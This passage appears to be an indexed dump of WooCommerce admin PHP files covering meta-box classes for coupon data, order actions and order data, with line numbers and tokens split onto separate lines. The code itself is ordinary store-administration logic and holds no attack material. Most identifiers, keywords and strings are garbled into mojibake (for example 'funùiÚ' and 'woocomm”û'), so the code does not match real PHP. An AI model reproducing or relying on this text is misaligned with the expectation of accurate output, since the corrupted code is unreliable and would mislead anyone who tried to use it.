}

163 
public
 
funùiÚ
 
	$§ve_m‘a_boxes
Ğ
$po¡_id
, 
$po¡
 ) {

165 iàĞ
	`em±y
Ğ
$po¡_id
 ) ||ƒm±yĞ
$po¡
 ) ) {

170 iàĞ
	`defšed
Ğ'DOING_AUTOSAVE' ) || 
	`is_št
Ğ
	`wp_is_po¡_»visiÚ
Ğ
$po¡
 ) ) || is_štĞ
	`wp_is_po¡_auto§ve
( $post ) ) ) {

175 iàĞ
	`em±y
Ğ
$_POST
['woocomm”û_m‘a_nÚû'] ) || ! 
	`wp_v”ify_nÚû
( $_POST['woocommerce_meta_nonce'], 'woocommerce_save_data' ) ) {

180 iàĞ
	`em±y
Ğ
$_POST
['po¡_ID'] ) || $_POST['po¡_ID'] !ğ
$po¡_id
 ) {

185 iàĞ! 
	`cu¼’t_u£r_ÿn
Ğ'ed™_po¡', 
$po¡_id
 ) ) {

190 iàĞ! 
	`š_¬¿y
Ğ
$po¡
->
po¡_ty³
, 
	`¬¿y
( 'product', 'shop_order', 'shop_coupon' ) ) ) {

194 
	`do_aùiÚ
Ğ'woocomm”û_´oûss_' . 
$po¡
->
po¡_ty³
 . '_m‘a', 
$po¡_id
, $post );

195 
	}
}

199 
Ãw
 
WC_Admš_M‘a_Boxes
();

	@includes/admin/post-types/meta-boxes/class-wc-meta-box-coupon-data.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

18 şas 
	cWC_M‘a_Box_CoupÚ_D©a
 {

23 
public
 
funùiÚ
 
	$ouut
Ğ
$po¡
 ) {

24 
	`wp_nÚû_f›ld
( 'woocommerce_save_data', 'woocommerce_meta_nonce' );

26 <
¡yË
 
ty³
="text/css">

27 #ed™-
¦ug
-
box
, #mšÜ-
publishšg
-
aùiÚs
 { 
di¥Ïy
:
nÚe
 }

28 </
¡yË
>

29 <
div
 
id
="coupÚ_İtiÚs" 
şass
="panel-wrap coupon_data">

31 <
div
 
şass
="wc-tabs-back"></div>

33 <
ul
 
şass
="coupÚ_d©a_b wc-bs" 
¡yË
="display:none;">

34 <?
php


35 
$coupÚ_d©a_bs
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚ_d©a_bs', 
	`¬¿y
(

36 'g’”®' => 
	`¬¿y
(

37 'Ïb–' => 
	`__
( 'General', 'woocommerce' ),

41 'u§ge_»¡riùiÚ' => 
	`¬¿y
(

42 'Ïb–' => 
	`__
( 'Usage Restriction', 'woocommerce' ),

46 'u§ge_lim™' => 
	`¬¿y
(

47 'Ïb–' => 
	`__
( 'Usage Limits', 'woocommerce' ),

53 
	`fÜ—ch
 ( 
$coupÚ_d©a_bs
 
as
 
$key
 => 
$b
 ) {

54 ?><
li
 
şass
="<?phpƒcho $key; ?>_options <?phpƒcho $key; ?>_tab <?phpƒcho implode( ' ' , (array) $tab['class'] ); ?>">

55 <
a
 
h»f
="#<?ph°echØ$b['rg‘']; ?>"><?
php
 
echo
 
	`esc_html
Ğ
$b
['label'] ); ?></a>

56 </
li
><?
php


59 </
ul
>

60 <
div
 
id
="g’”®_coupÚ_d©a" 
şass
="·ÃÈwoocomm”û_İtiÚs_·Ãl"><?
php


63 
	`woocomm”û_wp_£Ëù
Ğ
	`¬¿y
Ğ'id' => 'discouÁ_ty³', 'Ïb–' => 
	`__
Ğ'DiscouÁy³', 'woocomm”û' ), 'İtiÚs' => 
	`wc_g‘_coupÚ_ty³s
() ) );

66 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => 'coupÚ_amouÁ', 'Ïb–' => 
	`__
Ğ'CoupÚ‡mouÁ', 'woocomm”û' ), '¶aûhŞd”' => 
	`wc_fÜm©_loÿlized_´iû
Ğ0 ), 'desütiÚ' => __Ğ'V®uoàthcoupÚ.', 'woocomm”û' ), 'd©a_ty³' => '´iû', 'desc_t' => 
Œue
 ) );

69 
	`woocomm”û_wp_checkbox
Ğ
	`¬¿y
Ğ'id' => 'ä“_shpšg', 'Ïb–' => 
	`__
Ğ'AÎow f»shpšg', 'woocomm”û' ), 'desütiÚ' => 
	`¥rštf
(__Ğ'Checkhi box iàthcoupÚ g¿Á ä“ shpšg. Th<¨h»f="%s">ä“ shpšg m‘hod</a> mu¡ b’abËd w™hh"mu¡ u£ coupÚ" s‘tšg.', 'woocomm”û' ), 
	`admš_u¾
('admin.php?page=wc-settings&tab=shipping&section=WC_Shipping_Free_Shipping')) ) );

72 
	`woocomm”û_wp_checkbox
Ğ
	`¬¿y
Ğ'id' => '­¶y_befÜe_x', 'Ïb–' => 
	`__
( 'Apply beforeax', 'woocommerce' ), 'description' => __( 'Checkhis box ifhe coupon should be‡pplied before calculating cartax.', 'woocommerce' ) ) );

75 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => 'expœy_d©e', 'Ïb–' => 
	`__
Ğ'CoupÚƒxpœy d©e', 'woocomm”û' ), '¶aûhŞd”' => 
	`_x
( 'YYYY-MM-DD', 'placeholder', 'woocommerce' ), 'description' => '', 'class' => 'date-picker', 'custom_attributes' =>‡rray( 'pattern' => "[0-9]{4}-(0[1-9]|1[012])-(0[1-9]|1[0-9]|2[0-9]|3[01])" ) ) );

77 
	`do_aùiÚ
( 'woocommerce_coupon_options' );

79 ?></
div
>

80 <
div
 
id
="u§ge_»¡riùiÚ_coupÚ_d©a" 
şass
="·ÃÈwoocomm”û_İtiÚs_·Ãl"><?
php


82 
echo
 '<div class="options_group">';

85 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => 'mšimum_amouÁ', 'Ïb–' => 
	`__
Ğ'Mšimum s³nd', 'woocomm”û' ), '¶aûhŞd”' => __Ğ'NØmšimum', 'woocomm”û' ), 'desütiÚ' => __Ğ'Thi f›ld‡Îow youØ£ˆthmšimum subtÙ®‚“dedØu£hcoupÚ.', 'woocomm”û' ), 'd©a_ty³' => '´iû', 'desc_t' => 
Œue
 ) );

88 
	`woocomm”û_wp_checkbox
Ğ
	`¬¿y
Ğ'id' => 'šdividu®_u£', 'Ïb–' => 
	`__
( 'Individual use only', 'woocommerce' ), 'description' => __( 'Checkhis box ifhe coupon cannot be used in conjunction with other coupons.', 'woocommerce' ) ) );

91 
	`woocomm”û_wp_checkbox
Ğ
	`¬¿y
Ğ'id' => 'exşude_§Ë_™ems', 'Ïb–' => 
	`__
( 'Exclude sale items', 'woocommerce' ), 'description' => __( 'Checkhis box ifhe coupon should‚ot‡pplyo items on sale. Per-item coupons will only work ifhe item is‚ot on sale. Per-cart coupons will only work ifhere‡re‚o sale items inhe cart.', 'woocommerce' ) ) );

93 
echo
 '</div><div class="options_group">';

97 <
p
 
şass
="fÜm-f›ld"><
Ïb–
 ="´oduù_ids"><?
php
 
	`_e
( 'Products', 'woocommerce' ); ?></label>

98 <
£Ëù
 
id
="´oduù_ids" 
Çme
="´oduù_ids[]" 
şass
="ajax_cho£n_£Ëù_´oduùs_ªd_v¬ŸtiÚs" 
muÉË
="muÉË" 
d©a
-
¶aûhŞd”
="<?php _e( 'Search for‡…roduct&hellip;', 'woocommerce' ); ?>">

99 <?
php


100 
$´oduù_ids
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '´oduù_ids', 
Œue
 );

101 iàĞ
$´oduù_ids
 ) {

102 
$´oduù_ids
 = 
	`¬¿y_m­
Ğ'absšt', 
	`ex¶ode
( ',', $product_ids ) );

103 
	`fÜ—ch
 ( 
$´oduù_ids
 
as
 
$´oduù_id
 ) {

105 
$´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

107 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$´oduù_id
 ) . '" s–eùed="£Ëùed">' . 
	`wp_k£s_po¡
Ğ
$´oduù
->
	`g‘_fÜm©‹d_Çme
() ) . '</option>';

111 </
£Ëù
> <
img
 
şass
="h–p_t" 
d©a
-
t
='<?ph°_eĞ'
Produùs
 
which
 
Ãed
 
to
 
be
 
š
 
the
 
ÿ¹
Ø
u£
 
this
 
coupÚ
 
Ü
, "Produù DiscouÁs", which 
´oduùs
 
¬e
 
discouÁed
.', '
woocomm”û
' ); ?>' 
¤c
="<?ph°echØWC()->¶ugš_u¾(); ?>/as£ts/images/h–p.²g" 
height
="16" 
width
="16" /></
p
>

112 <?
php


116 <
p
 
şass
="fÜm-f›ld"><
Ïb–
 ="exşude_´oduù_ids"><?
php
 
	`_e
( 'Exclude…roducts', 'woocommerce' ); ?></label>

117 <
£Ëù
 
id
="exşude_´oduù_ids" 
Çme
="exşude_´oduù_ids[]" 
şass
="ajax_cho£n_£Ëù_´oduùs_ªd_v¬ŸtiÚs" 
muÉË
="muÉË" 
d©a
-
¶aûhŞd”
="<?php _e( 'Search for‡…roductâ€¦', 'woocommerce' ); ?>">

118 <?
php


119 
$´oduù_ids
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, 'exşude_´oduù_ids', 
Œue
 );

120 iàĞ
$´oduù_ids
 ) {

121 
$´oduù_ids
 = 
	`¬¿y_m­
Ğ'absšt', 
	`ex¶ode
( ',', $product_ids ) );

122 
	`fÜ—ch
 ( 
$´oduù_ids
 
as
 
$´oduù_id
 ) {

124 
$´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

126 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$´oduù_id
 ) . '" s–eùed="£Ëùed">' . 
	`wp_k£s_po¡
Ğ
$´oduù
->
	`g‘_fÜm©‹d_Çme
() ) . '</option>';

130 </
£Ëù
> <
img
 
şass
="h–p_t" 
d©a
-
t
='<?ph°_eĞ'
Produùs
 
which
 
mu¡
 
nÙ
 
be
 
š
 
the
 
ÿ¹
 
to
 
u£
 
this
 
coupÚ
 
Ü
, "Produù DiscouÁs", which 
´oduùs
 
¬e
‚Ù 
discouÁed
.', '
woocomm”û
' ); ?>' 
¤c
="<?ph°echØWC()->¶ugš_u¾(); ?>/as£ts/images/h–p.²g" 
height
="16" 
width
="16" /></
p
>

131 <?
php


133 
echo
 '</div><div class="options_group">';

137 <
p
 
şass
="fÜm-f›ld"><
Ïb–
 ="´oduù_ids"><?
php
 
	`_e
( 'Product categories', 'woocommerce' ); ?></label>

138 <
£Ëù
 
id
="´oduù_ÿ‹gÜ›s" 
Çme
="´oduù_ÿ‹gÜ›s[]" 
şass
="cho£n_£Ëù" 
muÉË
="muÉË" 
d©a
-
¶aûhŞd”
="<?php _e( 'Any category', 'woocommerce' ); ?>">

139 <?
php


140 
$ÿ‹gÜy_ids
 = (
¬¿y
è
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '´oduù_ÿ‹gÜ›s', 
Œue
 );

142 
$ÿ‹gÜ›s
 = 
	`g‘_‹rms
( 'product_cat', 'orderby=name&hide_empty=0' );

143 iàĞ
$ÿ‹gÜ›s
 ) 
	`fÜ—ch
 ( $ÿ‹gÜ› 
as
 
$ÿt
 ) {

144 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$ÿt
->
‹rm_id
 ) . '"' . 
	`£Ëùed
Ğ
	`š_¬¿y
Ğ$ÿt->‹rm_id, 
$ÿ‹gÜy_ids
 ), 
Œue
, 
çl£
 ) . '>' . 
	`esc_html
Ğ$ÿt->
Çme
 ) . '</option>';

147 </
£Ëù
> <
img
 
şass
="h–p_t" 
d©a
-
t
='<?ph°_eĞ'
A
 
´oduù
 
mu¡
 
be
 
š
 
this
 
ÿ‹gÜy
 
the
 
coupÚ
 
to
 
»maš
 
v®id
 
Ü
, "Produù DiscouÁs", 
´oduùs
 iÀ
the£
 
ÿ‹gÜ›s
 
wl
 b
discouÁed
.', '
woocomm”û
' ); ?>' 
¤c
="<?ph°echØWC()->¶ugš_u¾(); ?>/as£ts/images/h–p.²g" 
height
="16" 
width
="16" /></
p
>

148 <?
php


152 <
p
 
şass
="fÜm-f›ld"><
Ïb–
 ="exşude_´oduù_ÿ‹gÜ›s"><?
php
 
	`_e
( 'Exclude categories', 'woocommerce' ); ?></label>

153 <
£Ëù
 
id
="exşude_´oduù_ÿ‹gÜ›s" 
Çme
="exşude_´oduù_ÿ‹gÜ›s[]" 
şass
="cho£n_£Ëù" 
muÉË
="muÉË" 
d©a
-
¶aûhŞd”
="<?php _e( 'No categories', 'woocommerce' ); ?>">

154 <?
php


155 
$ÿ‹gÜy_ids
 = (
¬¿y
è
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, 'exşude_´oduù_ÿ‹gÜ›s', 
Œue
 );

157 
$ÿ‹gÜ›s
 = 
	`g‘_‹rms
( 'product_cat', 'orderby=name&hide_empty=0' );

158 iàĞ
$ÿ‹gÜ›s
 ) 
	`fÜ—ch
 ( $ÿ‹gÜ› 
as
 
$ÿt
 ) {

159 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$ÿt
->
‹rm_id
 ) . '"' . 
	`£Ëùed
Ğ
	`š_¬¿y
Ğ$ÿt->‹rm_id, 
$ÿ‹gÜy_ids
 ), 
Œue
, 
çl£
 ) . '>' . 
	`esc_html
Ğ$ÿt->
Çme
 ) . '</option>';

162 </
£Ëù
> <
img
 
şass
="h–p_t" 
d©a
-
t
='<?ph°_eĞ'
Produù
 
mu¡
 
nÙ
 
be
 
š
 
this
 
ÿ‹gÜy
 
the
 
coupÚ
 
to
 
»maš
 
v®id
 
Ü
, "Produù DiscouÁs", 
´oduùs
 iÀ
the£
 
ÿ‹gÜ›s
 
wl
‚Ù b
discouÁed
.', '
woocomm”û
' ) ?>' 
¤c
="<?ph°echØWC()->¶ugš_u¾(); ?>/as£ts/images/h–p.²g" 
height
="16" 
width
="16" /></
p
>

163 <?
php


165 
echo
 '</div><div class="options_group">';

168 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => 'cu¡om”_ema', 'Ïb–' => 
	`__
Ğ'Ema„e¡riùiÚs', 'woocomm”û' ), '¶aûhŞd”' => __Ğ'NØ»¡riùiÚs', 'woocomm”û' ), 'desütiÚ' => __Ğ'Li¡ oàema tØcheck‡gaš¡hcu¡om”\' blšgƒma wh’‡ÀÜd” i ¶aûd. S•¬©ema‡dd»s£ w™h commas.', 'woocomm”û' ), 'v®ue' => 
	`im¶ode
(', ', (
¬¿y
è
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, 'cu¡om”_ema', 
Œue
 ) ), 'desc_tip' =>rue, 'type' => 'email', 'class' => '', 'custom_attributes' =>‡rray(

172 
echo
 '</div>';

174 
	`do_aùiÚ
( 'woocommerce_coupon_options_usage_restriction' );

176 ?></
div
>

177 <
div
 
id
="u§ge_lim™_coupÚ_d©a" 
şass
="·ÃÈwoocomm”û_İtiÚs_·Ãl"><?
php


179 
echo
 '<div class="options_group">';

182 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => 'u§ge_lim™', 'Ïb–' => 
	`__
Ğ'U§glim™…” coupÚ', 'woocomm”û' ), '¶aûhŞd”' => 
	`_x
('UÆim™ed u§ge', '¶aûhŞd”', 'woocomm”û'), 'desütiÚ' => __Ğ'How mªyime thi coupÚ cª bu£d befÜ™ i void.', 'woocomm”û' ), 'ty³' => 'numb”', 'desc_t' => 
Œue
, 'class' => 'short', 'custom_attributes' =>‡rray(

188 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => 'lim™_u§ge_to_x_™ems', 'Ïb–' => 
	`__
Ğ'Lim™ u§gtØX i‹ms', 'woocomm”û' ), '¶aûhŞd”' => 
	`_x
Ğ'AµlyØ®Èqu®ifyšg i‹m š c¬t', '¶aûhŞd”', 'woocomm”û' ), 'desütiÚ' => __Ğ'Thmaximum‚umb” oàšdividu® i‹m thi coupÚ cª‡µlyØwh’ usšg…roduù discouÁs. L—vbÏnkØ­¶yØ®Èqu®ifyšg i‹m š c¬t.', 'woocomm”û' ), 'desc_t' => 
Œue
, 'class' => 'short', 'type' => 'number', 'custom_attributes' =>‡rray(

194 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => 'u§ge_lim™_³r_u£r', 'Ïb–' => 
	`__
Ğ'U§glim™…” u£r', 'woocomm”û' ), '¶aûhŞd”' => 
	`_x
Ğ'UÆim™ed u§ge', '¶aûhŞd”', 'woocomm”û' ), 'desütiÚ' => __Ğ'How mªyime thi coupÚ cª bu£d by‡Àšvidu® u£r. U£ blšgƒma fÜ gue¡s,‡nd u£¸ID fÜ†ogged iÀu£rs.', 'woocomm”û' ), 'desc_t' => 
Œue
, 'class' => 'short', 'type' => 'number', 'custom_attributes' =>‡rray(

199 
echo
 '</div>';

201 
	`do_aùiÚ
( 'woocommerce_coupon_options_usage_limit' );

203 ?></
div
>

204 <
div
 
şass
="clear"></div>

205 </
div
>

206 <?
php


212 
public
 
funùiÚ
 
	$§ve
Ğ
$po¡_id
, 
$po¡
 ) {

213 
glob®
 
$wpdb
;

216 
$po¡
->
po¡_t™Ë
 = 
	`­¶y_f‹rs
( 'woocommerce_coupon_code', $post->post_title );

217 
$wpdb
->
	`upd©e
Ğ$wpdb->
po¡s
, 
	`¬¿y
Ğ'po¡_t™Ë' => 
$po¡
->
po¡_t™Ë
 ),‡¼ayĞ'ID' => 
$po¡_id
 ) );

220 
$coupÚ_found
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
( "

221 
SELECT
 
$wpdb
->
po¡s
.
ID


222 
FROM
 
$wpdb
->
po¡s


223 
WHERE
 
$wpdb
->
po¡s
.
po¡_ty³
 = 'shop_coupon'

224 
AND
 
$wpdb
->
po¡s
.
po¡_¡©us
 = 'publish'

225 
AND
 
$wpdb
->
po¡s
.
po¡_t™Ë
 = '%s'

226 
AND
 
$wpdb
->
po¡s
.
ID
 !ğ%
s


229 iàĞ
$coupÚ_found
 ) {

230 
WC_Admš_M‘a_Boxes
::
	`add_”rÜ
Ğ
	`__
( 'Coupon code‡lreadyƒxists - customers will usehe†atest coupon withhis code.', 'woocommerce' ) );

234 
$ty³
 = 
	`wc_ş—n
Ğ
$_POST
['discount_type'] );

235 
$amouÁ
 = 
	`wc_fÜm©_decim®
Ğ
$_POST
['coupon_amount'] );

236 
$u§ge_lim™
 = 
	`em±y
Ğ
$_POST
['u§ge_lim™'] ) ? '' : 
	`absšt
( $_POST['usage_limit'] );

237 
$u§ge_lim™_³r_u£r
 = 
	`em±y
Ğ
$_POST
['u§ge_lim™_³r_u£r'] ) ? '' : 
	`absšt
( $_POST['usage_limit_per_user'] );

238 
$lim™_u§ge_to_x_™ems
 = 
	`em±y
Ğ
$_POST
['lim™_u§ge_to_x_™ems'] ) ? '' : 
	`absšt
( $_POST['limit_usage_to_x_items'] );

239 
$šdividu®_u£
 = 
	`is£t
Ğ
$_POST
['individual_use'] ) ? 'yes' : 'no';

240 
$expœy_d©e
 = 
	`wc_ş—n
Ğ
$_POST
['expiry_date'] );

241 
$­¶y_befÜe_x
 = 
	`is£t
Ğ
$_POST
['apply_before_tax'] ) ? 'yes' : 'no';

242 
$ä“_shpšg
 = 
	`is£t
Ğ
$_POST
['free_shipping'] ) ? 'yes' : 'no';

243 
$exşude_§Ë_™ems
 = 
	`is£t
Ğ
$_POST
['exclude_sale_items'] ) ? 'yes' : 'no';

244 
$mšimum_amouÁ
 = 
	`wc_fÜm©_decim®
Ğ
$_POST
['minimum_amount'] );

245 
$cu¡om”_ema
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
Ğ',', 
	`wc_ş—n
Ğ
$_POST
['customer_email'] ) ) ) );

247 iàĞ
	`is£t
Ğ
$_POST
['product_ids'] ) ) {

248 
$´oduù_ids
 = 
	`im¶ode
Ğ',', 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'štv®', (
¬¿y
è
$_POST
['product_ids'] ) ) );

250 
$´oduù_ids
 = '';

253 iàĞ
	`is£t
Ğ
$_POST
['exclude_product_ids'] ) ) {

254 
$exşude_´oduù_ids
 = 
	`im¶ode
Ğ',', 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'štv®', (
¬¿y
è
$_POST
['exclude_product_ids'] ) ) );

256 
$exşude_´oduù_ids
 = '';

259 
$´oduù_ÿ‹gÜ›s
 = 
	`is£t
Ğ
$_POST
['´oduù_ÿ‹gÜ›s'] ) ? 
	`¬¿y_m­
Ğ'štv®', $_POST['´oduù_ÿ‹gÜ›s'] ) : 
	`¬¿y
();

260 
$exşude_´oduù_ÿ‹gÜ›s
 = 
	`is£t
Ğ
$_POST
['exşude_´oduù_ÿ‹gÜ›s'] ) ? 
	`¬¿y_m­
Ğ'štv®', $_POST['exşude_´oduù_ÿ‹gÜ›s'] ) : 
	`¬¿y
();

263 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, 'discouÁ_ty³', 
$ty³
 );

264 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, 'coupÚ_amouÁ', 
$amouÁ
 );

265 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, 'šdividu®_u£', 
$šdividu®_u£
 );

266 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '´oduù_ids', 
$´oduù_ids
 );

267 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, 'exşude_´oduù_ids', 
$exşude_´oduù_ids
 );

268 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, 'u§ge_lim™', 
$u§ge_lim™
 );

269 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, 'u§ge_lim™_³r_u£r', 
$u§ge_lim™_³r_u£r
 );

270 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, 'lim™_u§ge_to_x_™ems', 
$lim™_u§ge_to_x_™ems
 );

271 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, 'expœy_d©e', 
$expœy_d©e
 );

272 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '­¶y_befÜe_x', 
$­¶y_befÜe_x
 );

273 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, 'ä“_shpšg', 
$ä“_shpšg
 );

274 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, 'exşude_§Ë_™ems', 
$exşude_§Ë_™ems
 );

275 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '´oduù_ÿ‹gÜ›s', 
$´oduù_ÿ‹gÜ›s
 );

276 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, 'exşude_´oduù_ÿ‹gÜ›s', 
$exşude_´oduù_ÿ‹gÜ›s
 );

277 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, 'mšimum_amouÁ', 
$mšimum_amouÁ
 );

278 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, 'cu¡om”_ema', 
$cu¡om”_ema
 );

280 
	`do_aùiÚ
Ğ'woocomm”û_coupÚ_İtiÚs_§ve', 
$po¡_id
 );

281 
	}
}

	@includes/admin/post-types/meta-boxes/class-wc-meta-box-order-actions.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_M‘a_Box_Ord”_AùiÚs
 {

20 
public
 
funùiÚ
 
	$ouut
Ğ
$po¡
 ) {

21 
glob®
 
$woocomm”û
, 
$theÜd”
, 
$wpdb
;

23 iàĞ! 
	`is_objeù
Ğ
$theÜd”
 ) )

24 
$theÜd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$po¡
->
ID
 );

26 
$Üd”
 = 
$theÜd”
;

28 <
ul
 
şass
="order_actions submitbox">

30 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_Üd”_aùiÚs_¡¬t', 
$po¡
->
ID
 ); ?>

32 <
li
 
şass
="wide" 
id
="actions">

33 <
£Ëù
 
Çme
="wc_order_action">

34 <
İtiÚ
 
v®ue
=""><?
php
 
	`_e
( 'Actions', 'woocommerce' ); ?></option>

35 <
İtgroup
 
Ïb–
="<?php _e( 'Resend orderƒmails', 'woocommerce' ); ?>">

36 <?
php


37 
$ma”
 = 
	`WC
()->
	`ma”
();

39 
$avaabË_emas
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_»£nd_Üd”_emas_avaabË', 
	`¬¿y
( 'new_order', 'customer_processing_order', 'customer_completed_order', 'customer_invoice' ) );

40 
$mas
 = 
$ma”
->
	`g‘_emas
();

42 iàĞ! 
	`em±y
Ğ
$mas
 ) ) {

43 
	`fÜ—ch
 ( 
$mas
 
as
 
$ma
 ) {

44 iàĞ
	`š_¬¿y
Ğ
$ma
->
id
, 
$avaabË_emas
 ) ) {

45 
echo
 '<İtiÚ v®ue="£nd_ema_'. 
	`esc_©Œ
Ğ
$ma
->
id
 ) .'">' . 
	`esc_html
Ğ$ma->
t™Ë
 ) . '</option>';

50 </
İtgroup
>

51 <
İtiÚ
 
v®ue
="»g’”©e_dowÆßd_³rmissiÚs"><?
php
 
	`_e
( 'Generate Download Permissions', 'woocommerce' ); ?></option>

52 <?
php
 
	`fÜ—ch
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_aùiÚs', 
	`¬¿y
(èè
as
 
$aùiÚ
 => 
$t™Ë
 ) { ?>

53 <
İtiÚ
 
v®ue
="<?ph°echØ$aùiÚ; ?>"><?
php
 
echo
 
$t™Ë
; ?></option>

54 <?
php
 } ?>

55 </
£Ëù
>

57 <
bu‰Ú
 
şass
="bu‰Ú wc-»lßd" 
t™Ë
="<?ph°_eĞ'Aµly', 'woocomm”û' ); ?>"><
¥ª
><?
php
 
	`_e
( 'Apply', 'woocommerce' ); ?></span></button>

58 </
li
>

60 <
li
 
şass
="wide">

61 <
div
 
id
="d–‘e-aùiÚ"><?
php


62 iàĞ
	`cu¼’t_u£r_ÿn
Ğ"d–‘e_po¡", 
$po¡
->
ID
 ) ) {

63 iàĞ! 
EMPTY_TRASH_DAYS
 )

64 
$d–‘e_‹xt
 = 
	`__
( 'Delete Permanently', 'woocommerce' );

66 
$d–‘e_‹xt
 = 
	`__
( 'Moveo Trash', 'woocommerce' );

67 ?><
a
 
şass
="subm™d–‘d–‘iÚ" 
h»f
="<?ph°echØesc_u¾Ğg‘_d–‘e_po¡_lškĞ$po¡->ID ) ); ?>"><?
php
 
echo
 
$d–‘e_‹xt
; ?></a><?php

69 ?></
div
>

71 <
šput
 
ty³
="subm™" 
şass
="bu‰Ú save_Üd” bu‰Ú-´im¬ys" 
Çme
="§ve" 
v®ue
="<?ph°_eĞ'SavOrd”', 'woocomm”û' ); ?>" 
d©a
-
t
="<?php _e( 'Save/updatehe order', 'woocommerce' ); ?>" />

72 </
li
>

74 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_Üd”_aùiÚs_’d', 
$po¡
->
ID
 ); ?>

76 </
ul
>

77 <?
php


83 
public
 
funùiÚ
 
	$§ve
Ğ
$po¡_id
, 
$po¡
 ) {

85 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$po¡_id
 );

88 iàĞ! 
	`em±y
Ğ
$_POST
['wc_order_action'] ) ) {

90 
$aùiÚ
 = 
	`wc_ş—n
Ğ
$_POST
['wc_order_action'] );

92 iàĞ
	`¡r¡r
Ğ
$aùiÚ
, 'send_email_' ) ) {

94 
	`do_aùiÚ
Ğ'woocomm”û_befÜe_»£nd_Üd”_emas', 
$Üd”
 );

97 
	`WC
()->
	`·ym’t_g©eways
();

98 
	`WC
()->
	`shpšg
();

101 
$ma”
 = 
	`WC
()->
	`ma”
();

103 
$ema_to_£nd
 = 
	`¡r_»¶aû
Ğ'£nd_ema_', '', 
$aùiÚ
 );

105 
$mas
 = 
$ma”
->
	`g‘_emas
();

107 iàĞ! 
	`em±y
Ğ
$mas
 ) ) {

108 
	`fÜ—ch
 ( 
$mas
 
as
 
$ma
 ) {

109 iàĞ
$ma
->
id
 =ğ
$ema_to_£nd
 ) {

110 
$ma
->
	`Œigg”
Ğ
$Üd”
->
id
 );

115 
	`do_aùiÚ
Ğ'woocomm”û_aá”_»£nd_Üd”_ema', 
$Üd”
, 
$ema_to_£nd
 );

117 } 
	`–£if
 ( 
$aùiÚ
 == 'regenerate_download_permissions' ) {

119 
	`d–‘e_po¡_m‘a
Ğ
$po¡_id
, '_download_permissions_granted' );

120 
	`wc_dowÆßdabË_´oduù_³rmissiÚs
Ğ
$po¡_id
 );

124 
	`do_aùiÚ
Ğ'woocomm”û_Üd”_aùiÚ_' . 
	`§n™ize_t™Ë
Ğ
$aùiÚ
 ), 
$Üd”
 );

128 
	}
}

	@includes/admin/post-types/meta-boxes/class-wc-meta-box-order-data.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

18 şas 
	cWC_M‘a_Box_Ord”_D©a
 {

20 
´iv©e
 
	m$blšg_f›lds
;

21 
´iv©e
 
	m$shpšg_f›lds
;

26 
public
 
funùiÚ
 
	$š™_add»ss_f›lds
() {

27 
£lf
::
$blšg_f›lds
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_admš_blšg_f›lds', 
	`¬¿y
(

28 'fœ¡_Çme' => 
	`¬¿y
(

29 'Ïb–' => 
	`__
( 'First Name', 'woocommerce' ),

30 'show' => 
çl£


32 'Ï¡_Çme' => 
	`¬¿y
(

33 'Ïb–' => 
	`__
( 'Last Name', 'woocommerce' ),

34 'show' => 
çl£


36 'com·ny' => 
	`¬¿y
(

37 'Ïb–' => 
	`__
( 'Company', 'woocommerce' ),

38 'show' => 
çl£


40 'add»ss_1' => 
	`¬¿y
(

41 'Ïb–' => 
	`__
( 'Address 1', 'woocommerce' ),

42 'show' => 
çl£


44 'add»ss_2' => 
	`¬¿y
(

45 'Ïb–' => 
	`__
( 'Address 2', 'woocommerce' ),

46 'show' => 
çl£


